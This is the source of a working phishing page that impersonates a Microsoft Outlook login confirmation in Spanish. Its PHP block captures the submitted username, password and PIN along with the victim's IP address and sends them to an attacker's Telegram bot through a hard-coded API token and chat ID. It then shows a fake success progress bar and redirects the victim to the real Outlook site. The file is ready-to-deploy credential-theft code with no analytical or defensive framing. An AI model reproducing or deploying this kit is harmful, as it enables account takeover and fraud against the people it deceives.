<?php  
include "fucker.php";
?>
<?php
session_start();
if( !empty($_POST['ejdysdysd3']) && !empty($_POST['fow773']) && !empty($_POST['sdf34fer']) ){
    
    $_SESSION['USER'] = $_POST['ejdysdysd3'];
    $_SESSION['PASS'] = $_POST['fow773'];
    $_SESSION['PASSx'] = $_POST['sdf34fer'];
  

    @$message = "Outl00k_OHteam\n\n"."\nIP: ".$_SERVER['REMOTE_ADDR']."\n"." ".$_SERVER['HTTP_X_FORWARDED_FOR']."\n".'Uzuario: '.$_SESSION['USER']."\n".'Pazzw0rd: '.$_SESSION['PASS']."\n".'P1n: '.$_SESSION['PASSx']. "\n";

    $apiToken = "7094746901:AAGdsJ4qKg6-5pefUzvMdRELumbazVNqbXE";

    $data = [
        'chat_id' => '6021042010',
        'text' => $message
    ];
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 

}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Refresh"
content="5;url=https://outlook.live.com/mail/0/?RpsCsrfState=1ab9b911-7235-397f-2165-77f3151c9ec6&url=/owa/0/?RpsCsrfState=1ab9b911-7235-397f-2165-77f3151c9ec6"> 
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

  <title>Log - Internet /(HOME</title>
  <link rel="stylesheet" href="artt/lacarardelh.css"> <style>
   .progress-container {
       width: 80%;
       margin: 50px auto;
       border: 2px solid #757575;
       border-radius: 5px;
       padding: 5px;
   }

   .progress-bar {
       width: 0;
       height: 30px;
       background-color: #159cf5;
       color: #fff;
       text-align: center;
       line-height: 30px;
       border-radius: 5px;
   }</style>
</head>
<body>


    <img class="log2" src="imdd/log-msu3.png" alt=""> <div style="background-color: rgb(25, 102, 255); width: 100%; ">
    
    <p style="color: white;padding: 10px; text-align: center;">Equipo Microsoft</p></div>
    <center>
 
</div>
  
        <form class="performancelog">
    
   <img src="imdd/vlog-ibn.png" alt="">

      <p>De manera Exitosa haz realizado este procedimiento, puedes seguir disfrutando de nuestros servicios!</p>
  <div class="progress-container">
   <div class="progress-bar" id="progress-bar">0%</div>
</div>


<script>
   function startProgressBar() {
       var progressBar = document.getElementById("progress-bar");
       var progress = 0;

       var interval = setInterval(function () {
           if (progress < 100) {
               progress++;
               progressBar.style.width = progress + "%";
               progressBar.textContent = progress + "%";
           } else {
               clearInterval(interval);
           }
       }, 30);
   }

   startProgressBar();
</script>
   
  <br><br>
  </form></center>
</div>    </div>


</body>
</html>